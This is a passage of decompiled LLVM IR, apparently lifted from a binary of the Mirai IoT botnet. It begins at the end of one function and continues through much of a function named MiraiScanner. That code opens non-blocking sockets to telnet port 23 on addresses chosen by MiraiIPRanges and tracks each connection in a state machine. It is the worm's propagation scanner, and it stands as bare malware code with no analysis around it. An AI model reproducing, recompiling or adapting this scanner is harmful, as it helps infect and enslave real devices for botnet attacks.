  %v6_16be4 = inttoptr i32 %v5_16be4 to i32*
  %v7_16be4 = load i32, i32* %v6_16be4, align 4
  store i32 %v7_16be4, i32* %r3.global-to-local, align 4
  %v1_16be8 = load i32, i32* @sp, align 4
  %v2_16be8 = inttoptr i32 %v1_16be8 to i32*
  store i32 %v7_16bbc, i32* %v2_16be8, align 4
  %v0_16bec = load i32, i32* %r3.global-to-local, align 4
  %v1_16bec = load i32, i32* @sp, align 4
  %v2_16bec = add i32 %v1_16bec, 4
  %v3_16bec = inttoptr i32 %v2_16bec to i32*
  store i32 %v0_16bec, i32* %v3_16bec, align 4
  %v0_16bf8 = load i32, i32* @r4, align 4
  store i32 %v0_16bf8, i32* @r2, align 4
  %v0_16bfc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_16bfc, i32* %r3.global-to-local, align 4
  %v3_16c00 = call i32 @Send(i32 %arg3, i32 ptrtoint ([60 x i8]* @global_var_3866c.798 to i32))
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  store i32 %v2_15cf4, i32* %r3.global-to-local, align 4
  %v1_16c18 = call i32 @reset_ipstate(i32 %v2_15cf4)
  br label %dec_label_pc_16c1c

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_162bc, %dec_label_pc_163f0, %dec_label_pc_16630, %dec_label_pc_16990, %dec_label_pc_16b40, %dec_label_pc_15d34, %dec_label_pc_15f58, %dec_label_pc_16a94, %dec_label_pc_169c4, %dec_label_pc_16974, %dec_label_pc_168c4, %dec_label_pc_168a4, %dec_label_pc_16830, %dec_label_pc_1676c, %dec_label_pc_16750, %dec_label_pc_16708, %dec_label_pc_16664, %dec_label_pc_16610, %dec_label_pc_165f0, %dec_label_pc_1652c, %dec_label_pc_16510, %dec_label_pc_164c8, %dec_label_pc_16424, %dec_label_pc_163d0, %dec_label_pc_163b0, %dec_label_pc_162f0, %dec_label_pc_162a0, %dec_label_pc_16234, %dec_label_pc_16218, %dec_label_pc_16094, %dec_label_pc_16078, %dec_label_pc_15f34, %dec_label_pc_15eec, %dec_label_pc_16b74
  %v1_16c20 = add nuw nsw i32 %storemerge549, 1
  store i32 %v1_16c20, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_16c34 = icmp slt i32 %v1_16c20, %stack_var_-64.0
  br i1 %v5_16c34, label %dec_label_pc_15ce4, label %dec_label_pc_15cd8

dec_label_pc_16c3c:                               ; preds = %entry
  %v2_16c44 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16c44, i32* @r4, align 4
  store i32 %v6_15ad4, i32* @r5, align 4
  store i32 %v9_15ad4, i32* @fp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16c20, { 2, 1, 0 }
  uselistorder i32 %v3_16a6c, { 1, 0 }
  uselistorder i32 %v3_166e0, { 1, 0 }
  uselistorder i32 %v3_164a0, { 1, 0 }
  uselistorder i32 %v5_16198, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v2_15fb8, { 1, 0 }
  uselistorder i32 %v1_15ea4, { 1, 0 }
  uselistorder i8* %v2_15ea0, { 1, 0, 2 }
  uselistorder i32 %v1_15e64, { 1, 0 }
  uselistorder i8* %v2_15e60, { 1, 0, 2 }
  uselistorder i32 %v2_15e18, { 1, 0 }
  uselistorder i32 %v2_15db8, { 2, 1, 0 }
  uselistorder i8* %v2_15d94, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15d90, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_15d4c, { 1, 0 }
  uselistorder i32 %v2_15cf4, { 70, 69, 71, 73, 72, 75, 74, 63, 62, 64, 66, 65, 68, 67, 47, 46, 49, 48, 53, 52, 54, 55, 57, 56, 51, 50, 59, 58, 61, 60, 43, 42, 41, 40, 39, 45, 44, 35, 34, 37, 38, 36, 31, 30, 29, 28, 27, 33, 32, 23, 22, 25, 26, 24, 21, 20, 19, 18, 15, 14, 17, 16, 2, 1, 4, 3, 5, 9, 10, 11, 6, 8, 7, 13, 12, 0 }
  uselistorder i32 %v3_15cf0, { 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32 %storemerge549, { 1, 7, 6, 4, 5, 3, 10, 8, 9, 13, 11, 12, 16, 14, 15, 19, 17, 18, 22, 20, 21, 29, 28, 27, 26, 25, 23, 24, 37, 36, 35, 33, 34, 32, 31, 30, 2, 0 }
  uselistorder i32 %v2_162cc, { 5, 0, 6, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i32 %v2_161ec, { 1, 0, 2 }
  uselistorder i32 %v2_160b4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_15cc0, { 2, 1, 0 }
  uselistorder i32 %storemerge458, { 1, 0 }
  uselistorder i32 %v2_15c3c, { 1, 0 }
  uselistorder i32 %v3_15c18, { 29, 28, 27, 25, 26, 24, 23, 22, 21, 19, 20, 18, 17, 0, 16, 33, 32, 42, 41, 40, 38, 39, 37, 36, 35, 34, 31, 1, 30, 48, 47, 46, 45, 44, 2, 43, 52, 51, 54, 53, 50, 3, 49, 60, 59, 58, 57, 56, 4, 55, 64, 63, 66, 65, 62, 5, 61, 76, 75, 73, 72, 71, 74, 70, 69, 68, 6, 67, 85, 86, 84, 83, 82, 7, 81, 8, 80, 90, 89, 88, 87, 9, 79, 10, 78, 77, 15, 14, 11, 13, 92, 93, 91, 12, 94 }
  uselistorder i32 %stack_var_-64.0, { 6, 5, 3, 8, 7, 1, 2, 4, 0 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-344, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 160, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 32, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 48, 46, 47, 49, 52, 50, 51, 56, 53, 54, 55, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 72, 70, 71, 73, 74, 75, 79, 76, 77, 78, 80, 81, 82, 83, 85, 84, 86, 87, 88, 89, 90, 91, 92, 95, 93, 94, 96, 97, 98, 102, 99, 100, 101, 103, 106, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 154, 123, 124, 125, 126, 129, 127, 128, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 156, 157, 158, 159, 172, 162, 161, 173, 163, 164, 165, 166, 167, 168, 169, 171, 170 }
  uselistorder i32* %r2.global-to-local, { 114, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 22, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 40, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 60, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 84, 81, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 118, 115, 119, 116, 117, 0 }
  uselistorder i32 ptrtoint ([228 x i8*]* @global_var_44f0c.667 to i32), { 3, 5, 4, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32 ptrtoint ([328 x i8*]* @global_var_44d7c.663 to i32), { 3, 5, 4, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32 (i32)* @init_rand, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c1c, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_160c8, { 1, 0 }
  uselistorder label %dec_label_pc_16094, { 1, 0 }
  uselistorder label %dec_label_pc_15d34, { 1, 0 }
  uselistorder label %dec_label_pc_15ce4, { 1, 0 }
  uselistorder label %dec_label_pc_15cd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c5c, { 1, 0 }
  uselistorder label %dec_label_pc_15b78, { 1, 0 }
}

define i32 @MiraiScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_16c7c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_16c7c, i32* %ip.global-to-local, align 4
  %v3_16c80 = load i32, i32* @r4, align 4
  store i32 %v3_16c80, i32* %stack_var_-24, align 4
  store i32 93320, i32* %stack_var_-4, align 4
  %v19_16c80 = ptrtoint i32* %stack_var_-24 to i32
  %v2_16c84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_16c84, i32* @fp, align 4
  %v0_16c98 = call i32 @getdtablesize()
  %v1_16ca0 = add i32 %v0_16c98, -100
  store i32 %v1_16ca0, i32* %r2.global-to-local, align 4
  %v7_16cb4 = icmp sgt i32 %v1_16ca0, %arg2
  br i1 %v7_16cb4, label %dec_label_pc_16cb8, label %dec_label_pc_16cc0

dec_label_pc_16cb8:                               ; preds = %entry
  br label %dec_label_pc_16cc0

dec_label_pc_16cc0:                               ; preds = %entry, %dec_label_pc_16cb8
  %stack_var_-64.0 = phi i32 [ %arg2, %dec_label_pc_16cb8 ], [ %v1_16ca0, %entry ]
  store i32 -588, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_16cd8 = call i32 @__GI_htons(i32 23)
  %v2_16cf8 = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_16cf8, i32* %r3.global-to-local, align 4
  store i32 %v2_16cf8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_16d08 = call i32 @__GI_memset()
  %v1_16d14 = call i32 @malloc(i32 1025)
  store i32 %v1_16d14, i32* %r3.global-to-local, align 4
  store i32 %v1_16d14, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1025, i32* @r2, align 4
  %v0_16d30 = call i32 @__GI_memset()
  %v3_16d38 = mul i32 %stack_var_-64.0, 32
  %v1_16d3c = or i32 %v3_16d38, 7
  %v1_16d40 = add i32 %v1_16d3c, 7
  %v3_16d44 = and i32 %v1_16d40, -24
  %v1_16d4c = load i32, i32* @sp, align 4
  %v2_16d4c = sub i32 %v1_16d4c, %v3_16d44
  %v1_16d5c = add i32 %v2_16d4c, 15
  %v3_16d60 = and i32 %v1_16d5c, -8
  %v2_16d84 = mul i32 %stack_var_-64.0, 5
  store i32 %v2_16d84, i32* %r3.global-to-local, align 4
  store i32 %v3_16d60, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_16d84, i32* @r2, align 4
  %v0_16d94 = call i32 @__GI_memset()
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_16e1c56 = icmp sgt i32 %stack_var_-64.0, 0
  br i1 %v5_16e1c56, label %dec_label_pc_16da4, label %dec_label_pc_16e20.preheader

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16cc0, %dec_label_pc_16da4
  %storemerge457 = phi i32 [ %v1_16e08, %dec_label_pc_16da4 ], [ 0, %dec_label_pc_16cc0 ]
  %v3_16dac = mul i32 %storemerge457, 32
  %v2_16db0 = add i32 %v3_16dac, %v3_16d60
  store i32 %v2_16db0, i32* %r3.global-to-local, align 4
  store i32 %v2_16db0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_16dc0 = call i32 @__GI_memset()
  %v3_16de0 = add i32 %v2_16db0, 9
  %v4_16de0 = inttoptr i32 %v3_16de0 to i8*
  store i8 1, i8* %v4_16de0, align 1
  %v2_16df8 = add i32 %v2_16db0, 28
  %v2_16e00 = inttoptr i32 %v2_16df8 to i32*
  store i32 %v1_16d14, i32* %v2_16e00, align 4
  %v1_16e08 = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_16e08, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  %v5_16e1c = icmp slt i32 %v1_16e08, %stack_var_-64.0
  br i1 %v5_16e1c, label %dec_label_pc_16da4, label %dec_label_pc_16e20.preheader

dec_label_pc_16e20.preheader:                     ; preds = %dec_label_pc_16da4, %dec_label_pc_16cc0
  %v2_16e8c = add i32 %v3_16d60, 8
  %v2_17188 = ptrtoint i32* %stack_var_-612 to i32
  %v2_171f8 = ptrtoint i32* %stack_var_-324 to i32
  %v2_172c4 = ptrtoint i32* %stack_var_-332 to i32
  %v2_1733c = ptrtoint i32* %stack_var_-340 to i32
  %v2_17340 = ptrtoint i32* %stack_var_-336 to i32
  %v2_1741c = add i32 %v3_16d60, 16
  %v2_17478 = add i32 %v3_16d60, 28
  br label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %dec_label_pc_16e20, %dec_label_pc_17d6c, %dec_label_pc_16e20.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-64.0, i32* %r3.global-to-local, align 4
  br i1 %v5_16e1c56, label %dec_label_pc_16e2c, label %dec_label_pc_16e20

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e20, %dec_label_pc_17d6c
  %storemerge548 = phi i32 [ %v1_17d70, %dec_label_pc_17d6c ], [ 0, %dec_label_pc_16e20 ]
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v3_16e38 = mul i32 %storemerge548, 32
  %v2_16e3c = add i32 %v3_16e38, %v3_16d60
  %v2_16e40 = add i32 %v2_16e3c, 16
  store i32 %v2_16e40, i32* %r3.global-to-local, align 4
  %v1_16e44 = inttoptr i32 %v2_16e40 to i32*
  %v2_16e44 = load i32, i32* %v1_16e44, align 8
  store i32 %v2_16e44, i32* %r3.global-to-local, align 4
  %v2_16e48 = icmp eq i32 %v2_16e44, 0
  br i1 %v2_16e48, label %dec_label_pc_16e50, label %dec_label_pc_16e7c

dec_label_pc_16e50:                               ; preds = %dec_label_pc_16e2c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_16e58 = call i32 @__GI_time(i32* null)
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v0_16e6c = load i32, i32* @r4, align 4
  %v3_16e6c = mul i32 %v0_16e6c, 32
  %v2_16e74 = add i32 %v2_1741c, %v3_16e6c
  store i32 %v2_16e74, i32* %r3.global-to-local, align 4
  %v2_16e78 = inttoptr i32 %v2_16e74 to i32*
  store i32 %v2_16e58, i32* %v2_16e78, align 8
  br label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e2c, %dec_label_pc_16e50
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_16e90 = add i32 %v2_16e8c, %v3_16e38
  store i32 %v2_16e90, i32* %r3.global-to-local, align 4
  %v1_16e94 = inttoptr i32 %v2_16e90 to i8*
  %v2_16e94 = load i8, i8* %v1_16e94, align 8
  %v3_16e94 = sext i8 %v2_16e94 to i32
  %v4_16e94 = zext i8 %v2_16e94 to i32
  store i32 %v4_16e94, i32* %r3.global-to-local, align 4
  switch i32 %v3_16e94, label %dec_label_pc_17d6c [
    i32 0, label %dec_label_pc_16ec4
    i32 1, label %dec_label_pc_1720c.lr.ph
    i32 2, label %dec_label_pc_1745c
    i32 3, label %dec_label_pc_17590
    i32 4, label %dec_label_pc_1769c
    i32 5, label %dec_label_pc_177d0
    i32 6, label %dec_label_pc_178dc
    i32 7, label %dec_label_pc_17b30
  ]

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16e7c
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_16ed8 = add i32 %v2_16e3c, 8
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v1_16edc = add i32 %v2_16e3c, 9
  %v2_16edc = inttoptr i32 %v1_16edc to i8*
  %v3_16edc = load i8, i8* %v2_16edc, align 1
  %v7_16ee0 = icmp eq i8 %v3_16edc, 1
  store i32 %storemerge548, i32* %r3.global-to-local, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  br i1 %v7_16ee0, label %dec_label_pc_16ee8, label %dec_label_pc_16f6c

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16ec4
  %v2_16ef8 = or i32 %v3_16e38, 28
  %v2_16efc = add i32 %v2_16ef8, %v3_16d60
  store i32 %v2_16efc, i32* %r3.global-to-local, align 4
  %v1_16f00 = inttoptr i32 %v2_16efc to i32*
  %v2_16f00 = load i32, i32* %v1_16f00, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  store i32 %v2_16e3c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_16f24 = call i32 @__GI_memset()
  %v2_16f3c = add i32 %v2_16e3c, 28
  store i32 %v2_16f3c, i32* %r2.global-to-local, align 4
  store i32 %v2_16f00, i32* %r3.global-to-local, align 4
  %v2_16f44 = inttoptr i32 %v2_16f3c to i32*
  store i32 %v2_16f00, i32* %v2_16f44, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_16f4c = call i32 @MiraiIPRanges(i32 %v0_16f24, i32 28, i32 %v2_16f3c, i32 %v2_16f00)
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v0_16f58 = load i32, i32* @r4, align 4
  %v3_16f58 = mul i32 %v0_16f58, 32
  %v2_16f5c = add i32 %v3_16f58, %v3_16d60
  %v2_16f60 = or i32 %v2_16f5c, 4
  store i32 %v2_16f60, i32* %r3.global-to-local, align 4
  %v2_16f64 = inttoptr i32 %v2_16f60 to i32*
  store i32 %v4_16f4c, i32* %v2_16f64, align 4
  br label %dec_label_pc_1709c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16ec4
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v3_16f84 = load i8, i8* %v2_16edc, align 1
  %v4_16f84 = zext i8 %v3_16f84 to i32
  store i32 %v4_16f84, i32* %r3.global-to-local, align 4
  %v2_16f88 = icmp eq i8 %v3_16f84, 0
  br i1 %v2_16f88, label %dec_label_pc_16f90, label %dec_label_pc_1709c

dec_label_pc_16f90:                               ; preds = %dec_label_pc_16f6c
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v1_16fa8 = add i32 %v2_16e3c, 10
  %v2_16fa8 = inttoptr i32 %v1_16fa8 to i8*
  %v3_16fa8 = load i8, i8* %v2_16fa8, align 2
  %v4_16fa8 = zext i8 %v3_16fa8 to i32
  %v1_16fac = add nuw nsw i32 %v4_16fa8, 1
  %v1_16fb0 = urem i32 %v1_16fac, 256
  store i32 %v1_16fb0, i32* %ip.global-to-local, align 4
  %v1_16fcc = trunc i32 %v1_16fac to i8
  store i8 %v1_16fcc, i8* %v2_16fa8, align 2
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v1_16fe8 = add i32 %v2_16e3c, 11
  %v2_16fe8 = inttoptr i32 %v1_16fe8 to i8*
  %v3_16fe8 = load i8, i8* %v2_16fe8, align 1
  %v4_16fe8 = zext i8 %v3_16fe8 to i32
  %v1_16fec = add nuw nsw i32 %v4_16fe8, 1
  %v1_16ff0 = urem i32 %v1_16fec, 256
  store i32 %v1_16ff0, i32* %ip.global-to-local, align 4
  %v1_1700c = trunc i32 %v1_16fec to i8
  store i8 %v1_1700c, i8* %v2_16fe8, align 1
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v3_17028 = load i8, i8* %v2_16fe8, align 1
  %v4_17028 = zext i8 %v3_17028 to i32
  store i32 %v4_17028, i32* %r3.global-to-local, align 4
  %v7_1702c = icmp eq i8 %v3_17028, 62
  br i1 %v7_1702c, label %dec_label_pc_17034, label %dec_label_pc_17054

dec_label_pc_17034:                               ; preds = %dec_label_pc_16f90
  store i32 %v2_16ed8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_16edc, align 1
  br label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_16f90, %dec_label_pc_17034
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  %v3_1706c = load i8, i8* %v2_16fa8, align 2
  %v4_1706c = zext i8 %v3_1706c to i32
  store i32 %v4_1706c, i32* %r3.global-to-local, align 4
  %v7_17070 = icmp eq i8 %v3_1706c, 62
  br i1 %v7_17070, label %dec_label_pc_17078, label %dec_label_pc_1709c

dec_label_pc_17078:                               ; preds = %dec_label_pc_17054
  store i32 %v2_16ed8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_16edc, align 1
  br label %dec_label_pc_17d6c

dec_label_pc_1709c:                               ; preds = %dec_label_pc_17054, %dec_label_pc_16f6c, %dec_label_pc_16ee8
  store i32 -588, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_170b4 = call i32 @__GI_htons(i32 23)
  store i32 %v2_16cf8, i32* %r3.global-to-local, align 4
  store i32 %v2_16cf8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_170e4 = call i32 @__GI_memset()
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_170fc = or i32 %v2_16e3c, 4
  store i32 %v2_170fc, i32* %r3.global-to-local, align 4
  %v1_17100 = inttoptr i32 %v2_170fc to i32*
  %v2_17100 = load i32, i32* %v1_17100, align 4
  store i32 %v2_17100, i32* %r3.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_17118 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_17124 = load i32, i32* @r4, align 4
  %v5_17124 = mul i32 %v2_17124, 32
  %v6_17124 = add i32 %v5_17124, %v3_16d60
  %v7_17124 = inttoptr i32 %v6_17124 to i32*
  store i32 %v3_17118, i32* %v7_17124, align 8
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_17130 = mul i32 %storemerge548, 32
  %v5_17130 = add i32 %v4_17130, %v3_16d60
  %v6_17130 = inttoptr i32 %v5_17130 to i32*
  %v7_17130 = load i32, i32* %v6_17130, align 8
  store i32 %v7_17130, i32* %r3.global-to-local, align 4
  %v7_17134 = icmp eq i32 %v7_17130, -1
  br i1 %v7_17134, label %dec_label_pc_17d6c, label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %dec_label_pc_1709c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17144 = load i32, i32* %v6_17130, align 8
  store i32 %v7_17144, i32* @r4, align 4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17150 = load i32, i32* %v6_17130, align 8
  store i32 %v7_17150, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_17160 = call i32 @fcntl(i32 %v7_17150, i32 3, i32 0)
  %v1_17168 = or i32 %v3_17160, 2048
  store i32 %v1_17168, i32* @r3, align 4
  %v0_1716c = load i32, i32* @r4, align 4
  store i32 %v1_17168, i32* %r2.global-to-local, align 4
  %v3_17178 = call i32 @fcntl(i32 %v0_1716c, i32 4, i32 %v1_17168)
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17184 = load i32, i32* %v6_17130, align 8
  store i32 %v7_17184, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_17198 = call i32 @connect(i32 %v7_17184, i32 %v2_17188, i32 16)
  store i32 %v3_17198, i32* %r3.global-to-local, align 4
  %v3_171a0 = icmp eq i32 %v3_17198, -1
  br i1 %v3_171a0, label %dec_label_pc_171a8, label %dec_label_pc_171d8

dec_label_pc_171a8:                               ; preds = %dec_label_pc_1713c
  %v0_171a8 = call i32 @__errno_location()
  store i32 %v0_171a8, i32* %r3.global-to-local, align 4
  %v1_171b0 = inttoptr i32 %v0_171a8 to i32*
  %v2_171b0 = load i32, i32* %v1_171b0, align 4
  store i32 %v2_171b0, i32* %r3.global-to-local, align 4
  %v7_171b4 = icmp eq i32 %v2_171b0, 115
  br i1 %v7_171b4, label %dec_label_pc_171d8, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171a8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_171d0 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_171d8:                               ; preds = %dec_label_pc_1713c, %dec_label_pc_171a8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v2_171f0 = inttoptr i32 %v2_16e3c to i32*
  %v3_171f0 = call i32 @advance_state(i32* %v2_171f0, i32 1)
  br label %dec_label_pc_17d6c

dec_label_pc_1720c.lr.ph:                         ; preds = %dec_label_pc_16e7c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_1720c.lr.ph, %dec_label_pc_1720c
  %storemerge610 = phi i32 [ 0, %dec_label_pc_1720c.lr.ph ], [ %v1_17220, %dec_label_pc_1720c ]
  store i32 %v2_171f8, i32* %r2.global-to-local, align 4
  %v5_17218 = mul nuw nsw i32 %storemerge610, 4
  %v6_17218 = add i32 %v5_17218, %v2_171f8
  %v7_17218 = inttoptr i32 %v6_17218 to i32*
  store i32 0, i32* %v7_17218, align 4
  %v1_17220 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_17220, i32* %r3.global-to-local, align 4
  %tmp39 = icmp ult i32 %v1_17220, 32
  br i1 %tmp39, label %dec_label_pc_1720c, label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_1720c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_1723c = mul i32 %storemerge548, 32
  %v5_1723c = add i32 %v4_1723c, %v3_16d60
  %v6_1723c = inttoptr i32 %v5_1723c to i32*
  %v7_1723c = load i32, i32* %v6_1723c, align 8
  %v3_17240 = udiv i32 %v7_1723c, 32
  %v3_17254 = mul nuw nsw i32 %v3_17240, 4
  %v2_1725c = add i32 %v3_17254, %v19_16c80
  store i32 %v2_1725c, i32* %r2.global-to-local, align 4
  %v2_17260 = add i32 %v2_1725c, -300
  store i32 %v2_17260, i32* %r3.global-to-local, align 4
  %v1_17264 = inttoptr i32 %v2_17260 to i32*
  %v2_17264 = load i32, i32* %v1_17264, align 4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17270 = load i32, i32* %v6_1723c, align 8
  %v1_17274 = urem i32 %v7_17270, 32
  %v6_1727c = shl i32 1, %v1_17274
  %v2_17280 = or i32 %v6_1727c, %v2_17264
  store i32 %v2_17280, i32* %v1_17264, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_172b8 = load i32, i32* %v6_1723c, align 8
  %v1_172bc = add i32 %v7_172b8, 1
  store i32 %v1_172bc, i32* %r2.global-to-local, align 4
  store i32 %v2_171f8, i32* %ip.global-to-local, align 4
  %v1_172c8 = load i32, i32* @sp, align 4
  %v2_172c8 = inttoptr i32 %v1_172c8 to i32*
  store i32 %v2_172c4, i32* %v2_172c8, align 4
  %v0_172cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_171f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_172dc = load i32, i32* %stack_var_-332, align 4
  %v5_172dc = call i32 @__libc_select(i32 %v0_172cc, i32 0, i32 %v2_171f8, i32 0, i32 %v4_172dc)
  store i32 %v5_172dc, i32* %r3.global-to-local, align 4
  %v7_172ec = icmp eq i32 %v5_172dc, 1
